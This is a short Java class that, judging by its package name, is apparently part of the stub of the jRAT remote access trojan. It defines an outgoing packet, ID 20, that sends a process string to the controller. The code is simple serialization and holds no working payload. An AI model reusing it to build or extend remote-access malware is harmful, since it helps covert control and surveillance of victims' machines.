package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.common.io.StringWriter;

public class Packet20Process extends AbstractOutgoingPacket {

	private String process;

	public Packet20Process(String process) {
		this.process = process;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(process);
	}

	@Override
	public byte getPacketId() {
		return 20;
	}

}
